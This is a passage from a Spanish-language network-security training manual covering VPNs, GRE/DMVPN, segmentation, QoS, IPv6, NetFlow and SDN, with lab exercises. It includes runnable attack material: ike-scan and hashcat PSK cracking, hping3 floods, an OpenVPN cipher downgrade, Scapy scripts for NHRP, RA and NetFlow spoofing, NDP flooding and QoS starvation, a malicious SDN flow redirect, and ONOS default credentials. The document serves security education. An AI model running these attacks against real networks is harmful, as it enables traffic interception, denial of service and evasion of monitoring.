**Ejercicio 3:** Configurá RSTP y forzá un cambio de topología. Medí el tiempo de reconvergencia vs STP clásico.

**Ejercicio 4:** Implementá BPDU guard y root guard en los puertos de acceso. Verificá que el ataque ya no funciona.

**Ejercicio 5:** Capturá BPDUs con [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark). Analizá los campos: root ID, bridge ID, path cost, timer values.

---

## 6. [vpn](../raw/4n0n1m4t0.md#vpn) Protocols

### 6.1 IPsec — IKEv1 vs IKEv2, Main/Aggressive Mode, [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat)-T

IPsec trabaja a nivel de [red](../raw/r3d3s-f0nd4m3nt0s.md) ([ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)). Cifra paquetes [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) completos.

#### IKEv1

```bash
# Modos de IKEv1:
# Main Mode: 6 mensajes, protege identidades (más seguro)
# Aggressive Mode: 3 mensajes, expone identidades (más rápido)
```

```cisco
! Configuración IPsec IKEv1
crypto isakmp policy 10
  encryption aes 256
  hash sha256
  authentication pre-share
  group 14
  lifetime 86400

crypto isakmp key M1Cl4v3 address 203.0.113.2

crypto ipsec transform-set ESP-AES256-SHA256 esp-aes 256 esp-sha256-hmac

crypto map CMAP 10 ipsec-isakmp
  set peer 203.0.113.2
  set transform-set ESP-AES256-SHA256
  match address 100
```

#### IKEv2

```bash
# IKEv2: más simple, más seguro, menos vulnerable a attacks
# 4 mensajes, protege identidades por defecto
# Soporta EAP, MOBIKE (roaming)
```

```cisco
! Configuración IPsec IKEv2
crypto ikev2 proposal PROPOSAL
  encryption aes-cbc-256
  integrity sha256
  group 14

crypto ikev2 policy POLICY
  proposal PROPOSAL

crypto ikev2 key-ring KEYRING
  peer 203.0.113.2
    address 203.0.113.2
    pre-shared-key M1Cl4v3
```

#### Aggressive Mode Attack

Aggressive Mode EXPONE la identidad (el [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) del PSK) y puede ser crackeado offline.

```bash
# Capturar IKE Aggressive Mode
tcpdump -i eth0 -v udp port 500

# Extraer el hash PSK
# Formato: PSK*<initiator_ip>*<responder_ip>:<hash>
# Con ike-scan:
ike-scan -M --aggressive --id=test 203.0.113.2

# Cracker el PSK con hashcat
# Modo 5300 = IKE-PSK MD5
# Modo 5400 = IKE-PSK SHA1
hashcat -m 5300 ike_psk_hash.txt rockyou.txt
```

#### NAT-T (NAT Traversal)

```bash
# IPsec tiene problemas con NAT (AH y ESP no pasan NAT)
# NAT-T encapsula ESP en UDP 4500

# Detectar NAT-T:
# IKE negocia si ambos lados soportan NAT-T
# Si hay NAT en el medio, se encapsula en UDP 4500
```

### 6.2 WireGuard — Crypto, [handshake](../raw/w1f1-4tt4cks.md#handshake), Roaming

WireGuard es un VPN moderno, minimalista y criptográficamente sólido.

#### Criptografía

```bash
# WireGuard usa:
# - Curve25519 para intercambio de claves (ECDH)
# - ChaCha20 para cifrado simétrico
# - Poly1305 para autenticación (MAC)
# - BLAKE2s para hashing
# - HKDF para derivación de claves
# - Noise IK handshake (1-RTT)
```

#### Handshake

```bash
# 1. Initiation -> Response (1 round trip)
# 2. Después: transporte (cifrado con claves derivadas)
# 3. Rekey periódico (cada 2 minutos)

# El handshake revela:
# - La clave pública del servidor
# - La clave pública del cliente
# - Timestamps (para prevenir replay)
```

#### Configuración

```bash
# Servidor WireGuard
[Interface]
PrivateKey = <server_private_key>
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32
```

```bash
# Cliente WireGuard
[Interface]
PrivateKey = <client_private_key>
Address = 10.0.0.2/24

[Peer]
PublicKey = <server_public_key>
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
```

#### Ataques a WireGuard

**1. Ataque de timestamp:** Los timestamps revelan cuándo se conectó el cliente.

```bash
# Capturar handshake WireGuard
tcpdump -i eth0 -X udp port 51820

# Extraer timestamp (indica actividad del cliente)
# Esto permite tracking de actividad
```

**2. Ataque de denegación de servicio:** Force rekey consume CPU.

```bash
# Enviar muchos handshake initiation falsos
hping3 --udp -p 51820 --flood target.com
```

**3. Ataque de endpoint tracking:** Si el cliente tiene PersistentKeepalive, el endpoint revela su IP.

#### Roaming (MOBIKE-like)

```bash
# WireGuard soporta roaming nativo
# Si el cliente cambia de IP, envía el próximo paquete desde la nueva IP
# El servidor actualiza automáticamente

# Esto es NATIVO, no necesita MOBIKE como IPsec
```

### 6.3 OpenVPN — TAP vs TUN, Ciphers, Auth

```bash
# TUN: VPN de capa 3 (IP) — más común
# TAP: VPN de capa 2 (Ethernet) — permite broadcasts

# OpenVPN usa TLS para autenticación y control
# TUN/TAP para datos

# Puertos comunes: 1194 UDP (default), 443 TCP (camuflado como HTTPS)
```

#### Configuración

```bash
# Servidor OpenVPN
port 1194
proto udp
dev tun
server 10.8.0.0 255.255.255.0
ca ca.crt
cert server.crt
key server.key
dh dh2048.pem
cipher AES-256-GCM
auth SHA256
tls-crypt ta.key
```

```bash
# Cliente OpenVPN
client
dev tun
proto udp
remote vpn.example.com 1194
resolv-retry infinite
ca ca.crt
cert client.crt
key client.key
cipher AES-256-GCM
auth SHA256
tls-crypt ta.key
```

#### Ataques a OpenVPN

**1. Ataque de downgrade de cipher**

```bash
# Si el servidor acepta cifrados débiles, forzar RC4 o DES
# Usar: --cipher RC4 --auth none
openvpn --config config.ovpn --cipher RC4 --auth none
```

**2. Ataque de compresión (VORACLE)**

```bash
# Si OpenVPN usa compresión (compress lzo), es vulnerable a VORACLE
# Similar a CRIME/BREACH en TLS

# Detectar si el servidor usa compresión:
# Buscar "compress" en la configuración
```

**3. Ataque de [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)-crypt**

```bash
# tls-crypt protege contra handshake analysis
# Sin tls-crypt, podés identificar servidores OpenVPN por el handshake
```

### 6.4 L2TP y PPTP

#### PPTP (Point to Point Tunneling Protocol)

```bash
# PPTP usa:
# - GRE para tunelización
# - MPPE para cifrado (RC4)
# - MS-CHAPv2 para autenticación

# VULNERABLE:
# - MS-CHAPv2 es crackeable (descifrando los 3 desafíos)
# - RC4 es débil
# - No tiene integridad

# No usar PPTP. Nunca.
```

**Ataque a MS-CHAPv2:**

```python
# Herramienta: chapcrack
# Descifra MS-CHAPv2 usando ataque de diccionario
```

#### L2TP (Layer 2 Tunneling Protocol)

```bash
# L2TP solo encapsula (no cifra)
# Generalmente se usa con IPsec (L2TP/IPsec)
# Puerto 1701 (L2TP), 500/4500 (IPsec)
```

### 6.5 Ejercicios prácticos

**Ejercicio 1:** Configurá IPsec con IKEv1 en GNS3. Probá contraatacar con ike-scan.

**Ejercicio 2:** Configurá IPsec IKEv2 con claves [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa). Compará con el laboratorio anterior.

**Ejercicio 3:** Configurá WireGuard entre 2 máquinas Linux. Capturá el handshake y analizá los campos.

**Ejercicio 4:** Configurá OpenVPN con TLS. Probá el downgrade de cipher.

**Ejercicio 5:** Capturá un handshake PPTP y MS-CHAPv2. Crackeá la contraseña usando chapcrack.

---

## 7. GRE Tunnels

### 7.1 Encapsulación GRE

GRE (Generic Routing Encapsulation) encapsula cualquier [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) sobre [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip).

```bash
# Header GRE (mínimo 4 bytes):
# +--------+--------+--------+--------+
# |C|R|K|S|s|Recur| Flags|   Version  |
# +--------+--------+--------+--------+
# |   Protocol Type (0x0800 = IPv4)    |
# +--------+--------+--------+--------+

# GRE no cifra, solo encapsula
# Usa protocolo IP 47
```

```cisco
! Configurar tunnel GRE
interface Tunnel0
  ip address 10.0.0.1 255.255.255.252
  tunnel source GigabitEthernet0/0
  tunnel destination 203.0.113.2
  tunnel mode gre ip

! Verificar
show interfaces tunnel 0
show ip route gre
```

### 7.2 GRE over IPsec

GRE + IPsec = encapsulación + [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado).

```cisco
! GRE sobre IPsec
crypto isakmp policy 10
  encryption aes 256
  hash sha256
  authentication pre-share
  group 14

crypto ipsec transform-set TSET esp-aes 256 esp-sha256-hmac
crypto ipsec profile GRE_PROTECT
  set transform-set TSET

interface Tunnel0
  ip address 10.0.0.1 255.255.255.252
  tunnel source GigabitEthernet0/0
  tunnel destination 203.0.113.2
  tunnel protection ipsec profile GRE_PROTECT
```

### 7.3 Multipoint GRE y NHRP

mGRE permite un tunnel GRE con múltiples destinos (hub-and-spoke).

NHRP (Next Hop Resolution Protocol) permite a los spokes encontrarse directamente.

```cisco
! Hub (DMVPN)
interface Tunnel0
  ip address 10.0.0.1 255.255.255.0
  ip nhrp authentication M1Cl4v3NHRP
  ip nhrp map multicast dynamic
  ip nhrp network-id 100
  tunnel source GigabitEthernet0/0
  tunnel mode gre multipoint

! Spoke
interface Tunnel0
  ip address 10.0.0.2 255.255.255.0
  ip nhrp authentication M1Cl4v3NHRP
  ip nhrp map 10.0.0.1 203.0.113.1
  ip nhrp map multicast 203.0.113.1
  ip nhrp network-id 100
  ip nhrp nhs 10.0.0.1
  tunnel source GigabitEthernet0/0
  tunnel mode gre multipoint
```

### 7.4 mGRE Attacks y DMVPN

#### NHRP Spoofing

```python
#!/usr/bin/env python3
from scapy.all import *

def nhrp_spoof(iface, fake_src_ip, fake_nbma_addr):
    # NHRP Registration Request falso
    # Hace que el hub registre una dirección NBMA falsa para un spoke
    
    pkt = IP(src=fake_src_ip, dst="10.0.0.1") / UDP(sport=0, dport=0) / Raw(b"Fake NHRP")
    send(pkt, iface=iface)
```

#### GRE Tunnel Hijacking

Si podés inyectar tráfico GRE, podés añadir [payload](../raw/m3t4spl01t.md#payloads) al tunnel.

```python
def gre_inject(iface, target_gre_ip, payload):
    # Inyectar paquete GRE dentro del tunnel
    # Solo funciona si estás en posición MITM
    
    gre = GRE(proto=0x0800)  # IPv4
    inner = IP(dst="192.168.1.10") / ICMP()
    outer = IP(dst=target_gre_ip, proto=47) / gre / inner
    send(outer, iface=iface)
```

### 7.5 Ejercicios prácticos

**Ejercicio 1:** Configurá un tunnel GRE simple entre 2 routers. Verificá conectividad de capa 3.

**Ejercicio 2:** Agregá IPsec sobre el GRE. Verificá con [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) que el tráfico está cifrado.

**Ejercicio 3:** Configurá DMVPN (hub + 2 spokes). Verificá que los spokes pueden comunicarse directamente (sin pasar por el hub).

**Ejercicio 4:** Simulá un ataque NHRP: registrá una dirección falsa en el hub.

---

## 8. Network Segmentation

### 8.1 ACLs

```cisco
! ACL Estándar (1-99, 1300-1999): solo IP origen
access-list 10 permit 192.168.1.0 0.0.0.255

! ACL Extendida (100-199, 2000-2699): IP origen, destino, puerto
access-list 100 permit tcp 192.168.1.0 0.0.0.255 host 10.0.0.1 eq 443
access-list 100 deny ip any any

! Aplicar ACL
interface GigabitEthernet0/1
  ip access-group 100 in
  ip access-group 100 out
```

#### Ataque a ACLs

```bash
# 1. IP Spoofing: falsificar IP origen permitida
# 2. Fragmentación: fragmentar paquetes para evadir ACLs
# 3. Tiny fragments: primer fragmento muy chico (solo header)
# 4. Overlapping fragments: fragmentos que se sobreescriben

# Fragmentación:
hping3 -c 1 -S --frag 24 -p 80 10.0.0.1
# El flag --frag 24 envía paquetes fragmentados de 24 bytes
```

### 8.2 VRF

VRF (Virtual Routing and Forwarding) permite múltiples tablas de routing en un mismo [router](../raw/r3d3s-f0nd4m3nt0s.md#routers).

```cisco
! Crear VRF
ip vrf DMZ
  rd 65000:100
  route-target export 65000:100
  route-target import 65000:100

ip vrf INTERNAL
  rd 65000:200
  route-target export 65000:200
  route-target import 65000:200

! Asignar interfaces a VRF
interface GigabitEthernet0/1
  ip vrf forwarding DMZ
  ip address 10.0.1.1 255.255.255.0
```

#### VRF Leaking (intencional o accidental)

```bash
# Route leaking entre VRFs
# Si hay route-target import/export entre VRFs, el tráfico puede cruzar

# Verificar:
show ip route vrf DMZ
show ip route vrf INTERNAL

# Si DMZ tiene rutas de INTERNAL, hay leaking
```

### 8.3 Zone-Based Firewalls

```cisco
! ZBF en Cisco IOS
! Crear zonas
zone security INSIDE
zone security OUTSIDE
zone security DMZ

! Crear políticas
class-map type inspect match-any WEB_TRAFFIC
  match protocol http
  match protocol https

policy-map type inspect INSIDE_TO_OUTSIDE
  class WEB_TRAFFIC
    inspect

! Aplicar políticas entre zonas
zone-pair security INSIDE-OUTSIDE source INSIDE destination OUTSIDE
  service-policy type inspect INSIDE_TO_OUTSIDE
```

### 8.4 Policy-Based Routing

PBR (Policy-Based Routing) permite rutear basado en criterios (no solo destino).

```cisco
! Route-map para PBR
route-map PBR permit 10
  match ip address 100  ! ACL 100
  set ip next-hop 10.0.0.2
  set interface GigabitEthernet0/2

! Aplicar
interface GigabitEthernet0/1
  ip policy route-map PBR
```

### 8.5 Ejercicios prácticos

**Ejercicio 1:** Configurá ACLs en un router para permitir solo [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/[https](../raw/r3d3s-f0nd4m3nt0s.md#https) desde una [red](../raw/r3d3s-f0nd4m3nt0s.md) interna a un servidor web.

**Ejercicio 2:** Probá evadir las ACLs del ejercicio 1 usando fragmentación.

**Ejercicio 3:** Configurá VRFs para segmentar DMZ, INTERNAL, y MANAGEMENT. Verificá que no hay comunicación entre VRFs.

**Ejercicio 4:** Configurá un Zone-Based [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) con zonas INSIDE, OUTSIDE, DMZ.

**Ejercicio 5:** Implementá PBR para mandar tráfico HTTP por un link y todo lo demás por otro.

---

## 9. QoS

### 9.1 Classification y Marking

```cisco
! Classification: identificar tráfico
class-map match-any VOIP
  match ip dscp ef
  match ip precedence 5

class-map match-any CRITICAL_DATA
  match ip dscp af31
  match ip precedence 3

! Marking: marcar paquetes
policy-map MARKING
  class VOIP
    set ip dscp ef
  class CRITICAL_DATA
    set ip dscp af31
```

#### DSCP Values

| DSCP | Name | Use |
|------|------|-----|
| 0 | BE | Best Effort |
| 8-16 | CS1-CS2 | Scavenger |
| 24-40 | AF11-AF43 | Assured Forwarding |
| 46 | EF | Expedited Forwarding (VoIP) |
| 48 | CS6 | Network Control |
| 56 | CS7 | Internetwork Control |

### 9.2 Policing, Shaping, Queuing

```cisco
! Policing: limitar tasa (descarta paquetes que exceden)
policy-map POLICE
  class CRITICAL_DATA
    police cir 1000000 bc 100000 be 100000
      conform-action transmit
      exceed-action drop

! Shaping: limitar tasa (bufferiza paquetes)
policy-map SHAPE
  class class-default
    shape average 5000000

! Queuing: ordenar paquetes
policy-map QUEUE
  class VOIP
    priority level 1
    police cir 500000
  class CRITICAL_DATA
    bandwidth remaining percent 50
  class class-default
    fair-queue
```

### 9.3 QoS Attacks — Starvation

#### Starvation Attack

Si podés marcar tu tráfico como EF (Expedited Forwarding), consumís todo el ancho de banda prioritario.

```python
#!/usr/bin/env python3
from scapy.all import *

def qos_starvation(target_ip, iface):
    # Marcar como EF (VoIP)
    pkt = IP(dst=target_ip, tos=0xB8) / TCP(dport=80) / Raw(b"A" * 1400)
    send(pkt, iface=iface, loop=1, inter=0.01)
```

#### Defensa contra Starvation

```cisco
! Policing de tráfico marcado
class-map match-any MARKED_TRAFFIC
  match ip dscp ef
  match ip dscp af41

policy-map POLICE_MARKED
  class MARKED_TRAFFIC
    police cir 500000
      conform-action transmit
      exceed-action drop
```

### 9.4 Ejercicios prácticos

**Ejercicio 1:** Configurá QoS con 3 clases: VOIP (EF), CRITICAL (AF31), BEST EFFORT. Verificá el comportamiento con tráfico generado.

**Ejercicio 2:** Simulá un ataque de starvation: enviá tráfico marcado como EF y saturá el enlace.

**Ejercicio 3:** Implementá policing para limitar el tráfico marcado como EF. Verificá que el ataque del ejercicio 2 ya no funciona.

**Ejercicio 4:** Usá [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) para analizar los campos DSCP en los paquetes.

---

## 10. IPv6

### 10.1 Address Types

```bash
# IPv6 Address Types:
# Unicast:
#   Global Unicast: 2000::/3 (internet)
#   Unique Local: fc00::/7 (similar a 10.0.0.0/8)
#   Link-Local: fe80::/10 (similar a 169.254.0.0/16)
#   Loopback: ::1

# Multicast:
#   FF02::1  - All nodes
#   FF02::2  - All routers
#   FF02::5  - OSPF
#   FF02::1:2 - DHCPv6
#   FF02::1:FFXX:XXXX - Solicited Node

# Anycast: misma dirección en múltiples interfaces
```

#### EUI-64 (Interface ID)

```bash
# EUI-64 genera la interface ID a partir de la MAC:
# MAC: 00:11:22:33:44:55
# EUI-64: 0211:22FF:FE33:4455
# (invierte bit 7 del primer byte: 00 → 02)
```

### 10.2 SLAAC vs DHCPv6

#### SLAAC (Stateless Address Autoconfiguration)

```bash
# Router Advertisement (RA) contiene:
# - Prefijo (2001:db8::/64)
# - Default route
# - MTU
# - Flags (M, O)

# El host genera su propia IP (EUI-64 o privacy extensions)
```

#### DHCPv6

```bash
# Stateful DHCPv6: asigna direcciones (como DHCPv4)
# Stateless DHCPv6: solo DNS, dominio, etc. (la IP viene de SLAAC)

# Puertos: UDP 546 (cliente), UDP 547 (servidor)
```

#### Privacy Extensions (RFC 4941)

```bash
# Genera direcciones temporales (cambian cada 24h)
# Dificulta tracking de dispositivos

# En Linux:
sysctl -w net.ipv6.conf.eth0.use_tempaddr=2
```

### 10.3 Neighbor Discovery Protocol

NDP reemplaza [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) en IPv6.

| ICMPv6 Type | Name | Description |
|-------------|------|-------------|
| 133 | [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) Solicitation | Host busca routers |
| 134 | Router Advertisement | Router anuncia prefijos |
| 135 | Neighbor Solicitation | ¿Quién tiene esta [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)? |
| 136 | Neighbor Advertisement | Yo tengo esta IP |
| 137 | Redirect | Redirección de ruta |

```bash
# Similar a ARP pero con funciones extendidas:
# - Neighbor Solicitation = ARP request
# - Neighbor Advertisement = ARP reply
# - Router Advertisement = DHCP inform + default gateway
```

### 10.4 NDP Attacks — SLAAC, RA Spoofing, Neighbor Cache Exhaustion

#### Router Advertisement Spoofing

El atacante envía RAs falsas para que los hosts usen el atacante como default gateway.

```python
#!/usr/bin/env python3
from scapy.all import *

def ra_spoof(iface, prefix="2001:db8::", gateway_mac="00:11:22:33:44:55"):
    # Router Advertisement falso
    ra = IPv6(dst="ff02::1") / ICMPv6ND_RA(
        M=0, O=0, curhoplimit=64, routerlifetime=1800
    ) / ICMPv6NDOptPrefixInfo(
        prefix=prefix,
        prefixlen=64,
        validlifetime=86400,
        preferredlifetime=14400
    ) / ICMPv6NDOptSrcLLAddr(lladdr=gateway_mac)
    
    send(ra, iface=iface, loop=1, inter=5)
```

#### Neighbor Cache Exhaustion

Inundar la [red](../raw/r3d3s-f0nd4m3nt0s.md) con solicitudes de vecinos falsos.

```python
def ndp_flood(iface, count=5000):
    for i in range(count):
        fake_ip = IPv6(f"fe80::{i:x}")
        ns = IPv6(dst="ff02::1") / ICMPv6ND_NS(tgt=fake_ip)
        send(ns, iface=iface)
```

#### SLAAC Attack

El atacante envía RAs con un prefijo falso y los hosts generan [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) basadas en el atacante.

```bash
# Similar a DHCP rogue pero en IPv6
# El atacante anuncia un prefijo falso
# Los hosts generan IPs en ese prefijo
# El atacante hace MITM
```

### 10.5 Ejercicios prácticos

**Ejercicio 1:** Configurá IPv6 en GNS3 entre 2 routers. Verificá conectividad con ping6.

**Ejercicio 2:** Configurá SLAAC en un segmento y DHCPv6 en otro. Verificá cómo los hosts obtienen IP.

**Ejercicio 3:** Simulá un RA spoofing: enviá RAs falsas desde un atacante. Verificá que los hosts usan al atacante como gateway.

**Ejercicio 4:** Simulá neighbor cache exhaustion. Monitoreá la tabla de vecinos del router antes y después.

**Ejercicio 5:** Capturá tráfico NDP con [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark). Analizá los mensajes NS, NA, RS, RA.

---

## 11. NetFlow / sFlow

### 11.1 Flow Monitoring Concepts

```bash
# NetFlow v5: formato fijo, 7 campos
#   - IP origen, IP destino
#   - Puerto origen, puerto destino
#   - Protocolo L3
#   - ToS (DSCP)
#   - Interface de entrada

# NetFlow v9: template-based, flexible
# IPFIX: NetFlow v10, estandarizado por IETF

# sFlow: muestreo estadístico (1 de cada N paquetes)
#   - Menos overhead que NetFlow
#   - Permite capturar payload completo
```

```cisco
! Configurar NetFlow
interface GigabitEthernet0/1
  ip flow ingress
  ip flow egress

ip flow-export version 9
ip flow-export destination 10.0.0.100 2055
ip flow-export source Loopback0
ip flow-cache timeout active 1
ip flow-cache timeout inactive 15
```

### 11.2 Network Telemetry

```bash
# Model-driven telemetry (YANG/ yang-push)
# Streaming telemetry: datos en tiempo real por gRPC
# Reemplaza a SNMP para monitoreo moderno

# gRPC de Cisco:
telemetry ietf subscription 100
  encoding encode-kv
  filter xpath /bgp-rib:bgp-rib
  stream yang-push
  update-policy periodic 500
  receiver ip address 10.0.0.100 57600 protocol grpc-tcp
```

### 11.3 Flow Analysis for Attack Detection

```bash
# Detección de anomalías con NetFlow:
# 1. Scanning: muchas flows de una IP a varias IPs/puertos
# 2. DDoS: muchas flows de muchas IPs a una IP
# 3. Data exfiltration: grandes volúmenes a IPs externas
# 4. C2 beaconing: tráfico periódico a IP sospechosa
# 5. DNS tunneling: muchas flows a DNS server no estándar
```

```python
#!/usr/bin/env python3
# Análisis simple de NetFlow
# Usando nfdump

import subprocess
import json

def analyze_flows(nf_file):
    # Top talkers
    result = subprocess.run(
        ["nfdump", "-r", nf_file, "-s", "srcip/bytes", "-n", "10"],
        capture_output=True, text=True
    )
    print("Top Talkers:")
    print(result.stdout)
    
    # Top destinations
    result = subprocess.run(
        ["nfdump", "-r", nf_file, "-s", "dstip/bytes", "-n", "10"],
        capture_output=True, text=True
    )
    print("Top Destinations:")
    print(result.stdout)
    
    # Anomalous ports
    result = subprocess.run(
        ["nfdump", "-r", nf_file, "-s", "dstport/flows", "-n", "20"],
        capture_output=True, text=True
    )
    print("Top Ports:")
    print(result.stdout)
```

### 11.4 Flow Manipulation

#### NetFlow Injection

Si podés inyectar flows falsas, podés engañar al sistema de monitoreo.

```python
#!/usr/bin/env python3
from scapy.all import *

def inject_fake_flow(target_collector_ip, fake_src_ip, fake_dst_ip):
    # Inyectar un paquete UDP que simula una flow NetFlow v5
    # NetFlow v5: 24 bytes header + N records de 48 bytes
    
    header = b"\x00\x05"  # Version 5
    header += b"\x00\x01"  # Count (1 record)
    header += b"\x00\x00\x00\x01"  # SysUptime
    header += b"\x00\x00\x00\x01"  # Unix Seconds
    header += b"\x00\x00\x00\x00"  # Unix Nanoseconds
    header += b"\x00\x00\x00\x00"  # FlowSequence
    header += b"\x00" * 4  # EngineType + EngineID + reserved
    
    # Flow record
    rec = b"\x0a\x00\x00\x01"  # SrcIP (10.0.0.1)
    rec += b"\x0a\x00\x00\x02"  # DstIP (10.0.0.2)
    rec += b"\x00\x00\x00\x00"  # NextHop
    rec += b"\x00\x00"  # Input ifIndex
    rec += b"\x00\x00"  # Output ifIndex
    rec += b"\x00\x00\x00\x00"  # Packets
    rec += b"\x00\x00\x00\x00"  # Octets
    rec += b"\x00\x00\x00\x00"  # First
    rec += b"\x00\x00\x00\x00"  # Last
    rec += b"\x00\x00"  # SrcPort
    rec += b"\x00\x50"  # DstPort (80)
    rec += b"\x00" * 2  # Padding
    rec += b"\x06"  # TCP
    rec += b"\x00"  # Tos
    rec += b"\x00\x00"  # SrcAS + DstAS
    rec += b"\x00"  # SrcMask
    rec += b"\x00"  # DstMask
    rec += b"\x00" * 2  # Padding
    
    pkt = IP(dst=target_collector_ip) / UDP(dport=2055) / Raw(header + rec)
    send(pkt)
```

### 11.5 Ejercicios prácticos

**Ejercicio 1:** Configurá NetFlow en un [router](../raw/r3d3s-f0nd4m3nt0s.md#routers). Enviá tráfico y verificá que las flows llegan al collector (nfdump).

**Ejercicio 2:** Analizá las flows capturadas. Identificá top talkers, protocolos, y puertos anómalos.

**Ejercicio 3:** Inyectá una flow falsa en el collector. Verificá que aparece en los reportes.

**Ejercicio 4:** Configurá sFlow y compará con NetFlow (overhead, precisión).

**Ejercicio 5:** Implementá un script que detecte scanning usando NetFlow (muchas flows de una [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)).

---

## 12. [sdn](../raw/r3d3s-4v4nz4d4s.md#sdn)

### 12.1 OpenFlow Protocol

OpenFlow separa el plano de control y el plano de datos.

```bash
# OpenFlow message types:
# OFPT_HELLO: Negociación de versiones
# OFPT_FEATURES_REQUEST/REPLY: Capacidades del switch
# OFPT_PACKET_IN: Paquete no coincide con flow table
# OFPT_FLOW_MOD: Agregar/modificar flow entry
# OFPT_PACKET_OUT: Enviar paquete por interfaz
# OFPT_MULTIPART_REQUEST/REPLY: Estadísticas

# Flow entry:
# Match fields + Priority + Counters + Instructions + Timeouts
```

```python
#!/usr/bin/env python3
# OpenFlow con Scapy (conceptual)
from scapy.contrib.openflow import *

# Crear un mensaje OpenFlow para agregar una flow
flow_mod = OFPTFlowMod(
    command=OFPFC_ADD,
    match=OFPMatch(
        in_port=1,
        eth_type=0x0800,
        ipv4_dst="10.0.0.1"
    ),
    instructions=[
        OFPITApplyActions(
            actions=[OFPActionOutput(port=2)]
        )
    ]
)
```

### 12.2 Controller Exploitation

#### Ryu Controller

```python
# Ryu es un controller OpenFlow en Python
# Vulnerabilidades comunes:
# - Sin autenticación (default)
# - Sin TLS (default)
# - Sin rate limiting
```

```bash
# Si el controller está expuesto:
# Puerto 6633/tcp (OpenFlow)
# Puerto 8080 (REST API de Ryu)

# Probar acceso a la REST API:
curl http://controller:8080/stats/switches
curl http://controller:8080/stats/flow/1
```

#### Floodlight Controller

```bash
# Floodlight tiene REST API en puerto 8080
# Probar:
curl http://controller:8080/wm/core/controller/switches/json
curl http://controller:8080/wm/core/switch/all/flow/json
```

#### ONOS Controller

```bash
# ONOS tiene CLI en puerto 8101 (SSH)
ssh -p 8101 karaf@controller
# Default: karaf/karaf

# Comandos de ONOS CLI:
onos> flows -s
onos> devices
onos> hosts
```

### 12.3 Flow Table Manipulation

Si obtenés acceso al controller, podés manipular las flow tables.

```python
# Agregar una flow maliciosa en Ryu
import requests

flow = {
    "dpid": 1,
    "priority": 65535,
    "match": {
        "in_port": 1,
        "eth_type": 2048  # IPv4
    },
    "instructions": [
        {
            "type": "APPLY_ACTIONS",
            "actions": [
                {"type": "OUTPUT", "port": 3}  # Redirigir a puerto del atacante
            ]
        }
    ]
}

requests.post("http://controller:8080/stats/flowentry/add", json=flow)
```

#### Table Overflow Attack

Los switches OpenFlow tienen memoria limitada para flow tables. Si se llena:

```bash
# 1. Inundar el switch con paquetes de diferentes orígenes
# 2. Cada paquete único genera una nueva flow entry
# 3. Cuando la tabla se llena, los paquetes se envían al controller
# 4. El controller se satura (DoS)

# Herramienta: mausezahn o Scapy
mausezahn -c 10000 -t tcp -p 1024
```

### 12.4 SDN Security

#### [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) en OpenFlow

```bash
# OpenFlow puede usar TLS para proteger la comunicación
# Pero muchos deployments no lo configuran

# Configurar TLS en Open vSwitch
ovs-vsctl set-ssl /etc/openvswitch/certs/switch-privkey.pem \
    /etc/openvswitch/certs/switch-cert.pem \
    /etc/openvswitch/certs/cacert.pem

ovs-vsctl set-controller ssl:10.0.0.100:6633
```

#### Mitigaciones SDN

```bash
# 1. Rate limiting de PacketIn
# 2. Firmware del switch con tabla capacity monitoring
# 3. Controller clustering
# 4. Firewall para REST API
# 5. Autenticación en APIs
# 6. TLS para OpenFlow
# 7. Auditoría de flow tables
```

### 12.5 Ejercicios prácticos

**Ejercicio 1:** Configurá Mininet con un [switch](../raw/r3d3s-f0nd4m3nt0s.md#switches) OpenFlow y un controller Ryu. Verificá conectividad.

**Ejercicio 2:** Agregá una flow entry via [rest api](../raw/4p1-s3cur1ty.md#rest-api) de Ryu. Verificá que los paquetes siguen la flow.

**Ejercicio 3:** Simulá un table overflow attack. Monitoreá el controller cuando la tabla del switch se llena.

**Ejercicio 4:** Agregá una flow maliciosa que redirija tráfico a un [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) del atacante.

**Ejercicio 5:** Configurá TLS en OpenFlow. Verificá que el tráfico entre switch y controller está [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado).

---

## 13. Apéndice A — Comandos Rápidos

### Cisco [ios](../raw/10s-p3nt3st1ng.md)

```cisco
show ip route
show ip int brief
show vlan brief
show interfaces trunk
show spanning-tree
show ip ospf neighbor
show ip bgp summary
show mpls forwarding-table
show mpls ldp neighbor
show crypto isakmp sa
show crypto ipsec sa
show ip flow export
show ipv6 neighbors

debug ip packet
debug ip ospf events
debug ip bgp updates
debug mpls ldp events
```

### Linux

```bash
ip route show
ip addr show
ip link show
bridge vlan show
tc qdisc show
tc class show
tc filter show
ss -tuln
tcpdump -i eth0 -v
tcpdump -i eth0 proto 89  # OSPF
tcpdump -i eth0 port 179  # BGP
tcpdump -i eth0 proto 47  # GRE
tcpdump -i eth0 udp port 500  # IKE
tcpdump -i eth0 udp port 51820  # WireGuard
tcpdump -i eth0 icmp6  # IPv6 NDP
```

### Herramientas de Ataque

```bash
# Yersinia (VLAN hopping, STP, VTP, CDP, DHCP)
yersinia -I

# ike-scan (IPsec)
ike-scan -M --aggressive target.com

# Scapy (construcción de paquetes)
python3 -c "from scapy.all import *; ..."

